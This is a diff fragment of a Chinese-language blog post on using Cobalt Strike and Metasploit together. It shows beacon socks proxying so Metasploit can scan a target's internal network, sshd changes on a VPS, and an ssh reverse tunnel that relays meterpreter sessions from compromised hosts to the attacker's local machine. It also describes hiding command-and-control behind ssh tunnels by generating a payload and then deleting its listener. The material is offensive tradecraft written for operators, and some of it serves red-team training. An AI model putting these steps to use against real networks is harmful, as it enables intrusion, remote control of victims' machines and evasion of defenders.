+<h2 id="通过beacon内置socks，将msf带入目标内网"><a href="#通过beacon内置socks，将msf带入目标内网" class="headerlink" title="通过beacon内置socks，将msf带入目标内网"></a>通过beacon内置socks，将msf带入目标内网</h2><p>** CS **</p>
+<ul>
+<li>beacon&gt; getuid</li>
+<li>beacon&gt; socks 1080<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png" alt="avatar"></li>
+<li><ul>
+<li>msf **</li>
+</ul>
+</li>
+<li>msf5 &gt; setg Proxies socks4:XXX.XXX.XXX.XXX:1080  //设置代理</li>
+<li>msf5 &gt; setg ReversseAllowProxy true  //双向通道</li>
+</ul>
+<p>现在就可以直接用msf的auxiliary模块扫描目标内网了<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png" alt="avatar"></p>
+<h2 id="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><a href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf" class="headerlink" title="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **"></a>使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</h2><p><strong>* 首先创建CS外部tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png" alt="avatar"><br><strong>* 然后到本地机器msf创建tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png" alt="avatar"><br><strong>* 随后，在vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务，这是所有使用ssh隧道转发前的必备操作。 *</strong></p>
+<pre><code># vi/etc/ssh/sshd_config
+AllowTcpForwarding yes
+GatewayPorts yes
+TCPKeepAlive yes
+PasswordAuthentication yes
+# systemctl restartsshd.service</code></pre><p><strong>* 回到本地linux中并通过ssh隧道做好ssh转发，意思就是通过vps把来自外部的8080端口流量全部转到本地linux的8080端口上，而本地linux的8080端口上跑的又正好是msf的监听器，所以，最终才会造成meterpreter本地上线的效果 *</strong></p>
+<pre><code># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.108:8080 root@xxx.xxx.xxx.xxx -p 22 //建立ssh隧道
+&gt;  -C     //压缩数据 
+&gt;  -f     //运行在后台
+&gt;  -N     //不远程执行命令，对端口转发很有用
+&gt;  -g     //允许远程主机连接到本地转发端口
+&gt;  -R     //[bind_address:]port:host:hostport  端口及地址配置
+# netstat -tulnp | grep &apos;8080&apos; //检查通道是否成功建立</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png" alt="avatar"></p>
+<p>   <strong>* 最后，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，也可以选择批量操作 *</strong></p>
+<h2 id="使用msf的exp直接弹回一个beacon"><a href="#使用msf的exp直接弹回一个beacon" class="headerlink" title="使用msf的exp直接弹回一个beacon"></a>使用msf的exp直接弹回一个beacon</h2><p>** 暂时复现失败 ** </p>
+<h2 id="灵活利用ssh隧道深度隐藏C2"><a href="#灵活利用ssh隧道深度隐藏C2" class="headerlink" title="灵活利用ssh隧道深度隐藏C2"></a>灵活利用ssh隧道深度隐藏C2</h2><blockquote>
+<p>首先，创建一个普通的http 反向beacon监听器，并用该监听器生成一个64位的exe payload，随后再立即删除该监听器<br>然后本地开启ssh隧道转发，转发刚刚删除的监听器的端口。<br>本地启动cs服务，监听转发的端口，监听器与删除监听器配置相同。<br>当payload执行，本地服务上线。<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png" alt="avatar"></p>
+</blockquote>
 
           
         
